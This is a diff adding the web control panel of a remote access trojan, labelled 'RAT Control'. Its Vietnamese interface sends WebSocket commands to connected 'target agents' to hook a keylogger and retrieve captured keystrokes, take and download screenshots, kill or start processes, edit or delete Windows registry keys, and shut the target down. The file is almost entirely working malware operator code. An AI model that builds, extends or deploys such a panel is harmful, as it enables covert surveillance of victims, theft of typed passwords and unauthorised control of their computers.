@@ -1,0 +1,270 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>RAT Advanced WebAdmin</title>
+    <!-- Bootstrap 5 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background-color: #f4f6f9;
+        }
+
+        .sidebar {
+            min-height: 100vh;
+            background: #212529;
+            color: white;
+        }
+
+        .nav-link {
+            color: #adb5bd;
+            cursor: pointer;
+        }
+
+            .nav-link.active, .nav-link:hover {
+                background-color: #0d6efd;
+                color: white;
+            }
+
+        .content-section {
+            display: none;
+            padding: 20px;
+        }
+
+            .content-section.active {
+                display: block;
+            }
+
+        .terminal {
+            background: black;
+            color: #00ff00;
+            height: 300px;
+            overflow-y: scroll;
+            padding: 10px;
+            font-family: monospace;
+            border-radius: 5px;
+        }
+
+        .card-img-top {
+            height: 150px;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <div class="col-md-2 sidebar p-3">
+                <h4 class="text-center"><i class="fa-solid fa-ghost"></i> RAT Control</h4>
+                <hr>
+                <div class="mb-3">
+                    <label class="form-label text-muted small">Target Agent:</label>
+                    <select id="agentSelect" class="form-select form-select-sm bg-secondary text-white border-0"></select>
+                    <div id="status" class="text-danger small mt-1">Disconnected</div>
+                </div>
+
+                <ul class="nav flex-column">
+                    <li class="nav-item"><a class="nav-link active" onclick="showTab('dashboard')"><i class="fa-solid fa-gauge"></i> Dashboard</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('process')"><i class="fa-solid fa-microchip"></i> Process</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('registry')"><i class="fa-brands fa-windows"></i> Registry</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('screen')"><i class="fa-solid fa-camera"></i> Screen Spy</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('keylog')"><i class="fa-solid fa-keyboard"></i> Keylogger</a></li>
+                </ul>
+            </div>
+
+            <!-- Main Content -->
+            <div class="col-md-10">
+
+                <!-- Dashboard -->
+                <div id="dashboard" class="content-section active">
+                    <h3>Dashboard</h3>
+                    <div class="alert alert-info">Chào mừng! Hãy chọn một Agent từ menu bên trái để bắt đầu.</div>
+                    <button class="btn btn-danger" onclick="sendCommand('SHUTDOWN', '')"><i class="fa-solid fa-power-off"></i> Tắt máy Target</button>
+                </div>
+
+                <!-- Process -->
+                <div id="process" class="content-section">
+                    <div class="d-flex justify-content-between mb-3">
+                        <h3>Process Manager</h3>
+                        <div>
+                            <button class="btn btn-primary btn-sm" onclick="sendCommand('GET_PROCESS', '')">Refresh</button>
+                            <button class="btn btn-success btn-sm" onclick="startApp()">Start App</button>
+                        </div>
+                    </div>
+                    <table class="table table-bordered bg-white shadow-sm">
+                        <thead class="table-dark"><tr><th>ID</th><th>Process Name</th><th>Threads</th><th>Action</th></tr></thead>
+                        <tbody id="processTable"></tbody>
+                    </table>
+                </div>
+
+                <!-- Registry -->
+                <div id="registry" class="content-section">
+                    <h3>Registry Editor</h3>
+                    <div class="card p-3 shadow-sm mb-3">
+                        <div class="row g-2">
+                            <div class="col-md-3">
+                                <select id="regRoot" class="form-select">
+                                    <option>HKEY_CURRENT_USER</option>
+                                    <option>HKEY_LOCAL_MACHINE</option>
+                                    <option>HKEY_CLASSES_ROOT</option>
+                                </select>
+                            </div>
+                            <div class="col-md-9"><input id="regPath" class="form-control" placeholder="Path (e.g., Software\Microsoft\Test)"></div>
+                            <div class="col-md-4"><input id="regName" class="form-control" placeholder="Value Name"></div>
+                            <div class="col-md-4"><input id="regValue" class="form-control" placeholder="Value Data"></div>
+                            <div class="col-md-2">
+                                <select id="regType" class="form-select"><option>String</option><option>DWORD</option></select>
+                            </div>
+                            <div class="col-md-12 text-end mt-2">
+                                <button class="btn btn-info" onclick="sendReg('GET_VALUE')">Get Value</button>
+                                <button class="btn btn-warning" onclick="sendReg('SET_VALUE')">Set Value</button>
+                                <button class="btn btn-danger" onclick="sendReg('DELETE_VALUE')">Del Value</button>
+                                <button class="btn btn-success" onclick="sendReg('CREATE_KEY')">Create Key</button>
+                                <button class="btn btn-dark" onclick="sendReg('DELETE_KEY')">Delete Key</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="terminal" id="regOutput">Waiting for result...</div>
+                </div>
+
+                <!-- Screen Spy (Gallery) -->
+                <div id="screen" class="content-section">
+                    <div class="d-flex justify-content-between mb-3">
+                        <h3>Screen Capture Gallery</h3>
+                        <div>
+                            <button class="btn btn-primary" onclick="sendCommand('TAKE_PIC', '')"><i class="fa-solid fa-camera"></i> Chụp Mới</button>
+                            <button class="btn btn-secondary" onclick="document.getElementById('gallery').innerHTML=''"><i class="fa-solid fa-trash"></i> Xóa Hết</button>
+                        </div>
+                    </div>
+                    <div class="row" id="gallery">
+                        <!-- Ảnh sẽ được thêm vào đây -->
+                    </div>
+                </div>
+
+                <!-- Keylogger -->
+                <div id="keylog" class="content-section">
+                    <h3>Keylogger</h3>
+                    <div class="btn-group mb-3">
+                        <button class="btn btn-danger" onclick="sendCommand('KEYLOG_HOOK', '')">HOOK (Bắt đầu)</button>
+                        <button class="btn btn-secondary" onclick="sendCommand('KEYLOG_UNHOOK', '')">UNHOOK (Dừng)</button>
+                        <button class="btn btn-primary" onclick="sendCommand('KEYLOG_PRINT', '')">IN PHÍM (Lấy log)</button>
+                        <button class="btn btn-warning" onclick="sendCommand('KEYLOG_CLEAR', '')">XÓA LOG (Trên Agent)</button>
+                    </div>
+                    <div class="terminal" id="keylogData"></div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const MY_ID = "WEB_" + Date.now();
+        const ws = new WebSocket("ws://localhost:8080"); // Đổi IP nếu cần
+        let currentAgent = "";
+
+        ws.onopen = () => {
+            document.getElementById("status").innerText = "Connected";
+            document.getElementById("status").className = "text-success small mt-1";
+            ws.send(JSON.stringify({ type: "REGISTER", role: "ADMIN", id: MY_ID }));
+        };
+
+        ws.onmessage = (event) => {
+            const packet = JSON.parse(event.data);
+
+            // Update Agent List
+            if (packet.type === "AGENT_LIST") {
+                const select = document.getElementById("agentSelect");
+                select.innerHTML = "";
+                packet.data.forEach(id => {
+                    const opt = document.createElement("option");
+                    opt.value = id; opt.text = id;
+                    select.appendChild(opt);
+                });
+                if (packet.data.length > 0 && currentAgent === "") currentAgent = packet.data[0];
+            }
+
+            // Handle Responses
+            if (packet.from) {
+                const payload = packet.payload;
+                const cmd = payload.cmd;
+                const data = payload.data;
+
+                if (cmd === "PROCESS_LIST") {
+                    const list = JSON.parse(data);
+                    const tbody = document.getElementById("processTable");
+                    tbody.innerHTML = "";
+                    list.forEach(p => {
+                        tbody.innerHTML += `<tr><td>${p.Id}</td><td>${p.Name}</td><td>${p.Threads}</td>
+                            <td><button class='btn btn-sm btn-danger' onclick="killProc(${p.Id})">Kill</button></td></tr>`;
+                    });
+                }
+                else if (cmd === "PIC_DATA") {
+                    addScreenToGallery(data);
+                }
+                else if (cmd === "KEYLOG_DATA") {
+                    document.getElementById("keylogData").innerText += data;
+                }
+                else if (cmd === "LOG_MSG" || cmd === "REG_RESULT") {
+                    if (cmd === "REG_RESULT") document.getElementById("regOutput").innerText += "\n> " + data;
+                    else alert("Agent: " + data);
+                }
+            }
+        };
+
+        // --- HELPER FUNCTIONS ---
+
+        function sendCommand(cmd, data) {
+            currentAgent = document.getElementById("agentSelect").value;
+            if (!currentAgent) { alert("Chưa chọn Agent!"); return; }
+            ws.send(JSON.stringify({ targetId: currentAgent, payload: { cmd: cmd, data: String(data) } }));
+        }
+
+        // Registry Logic
+        function sendReg(action) {
+            const payload = {
+                Action: action,
+                Root: document.getElementById("regRoot").value,
+                Path: document.getElementById("regPath").value,
+                Name: document.getElementById("regName").value,
+                Value: document.getElementById("regValue").value,
+                Type: document.getElementById("regType").value
+            };
+            sendCommand("REG_ACTION", JSON.stringify(payload));
+        }
+
+        // Gallery Logic
+        function addScreenToGallery(base64) {
+            const gallery = document.getElementById("gallery");
+            const time = new Date().toLocaleTimeString();
+            const imgSrc = "data:image/png;base64," + base64;
+
+            const html = `
+                <div class="col-md-4 mb-3">
+                    <div class="card shadow-sm">
+                        <a href="${imgSrc}" target="_blank"><img src="${imgSrc}" class="card-img-top"></a>
+                        <div class="card-body p-2 text-center">
+                            <small class="text-muted">${time}</small><br>
+                            <a href="${imgSrc}" download="capture_${Date.now()}.png" class="btn btn-sm btn-success mt-1"><i class="fa-solid fa-download"></i> Lưu</a>
+                        </div>
+                    </div>
+                </div>`;
+            gallery.insertAdjacentHTML('afterbegin', html);
+        }
+
+        function killProc(pid) { if (confirm("Kill " + pid + "?")) sendCommand("KILL_PROCESS", pid); }
+        function startApp() { const n = prompt("Tên App:"); if (n) sendCommand("START_PROCESS", n); }
+
+        function showTab(id) {
+            document.querySelectorAll(".content-section").forEach(d => d.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            document.querySelectorAll(".nav-link").forEach(d => d.classList.remove('active'));
+            event.target.closest('.nav-link').classList.add('active');
+        }
+    </script>
+
+</body>
+</html>
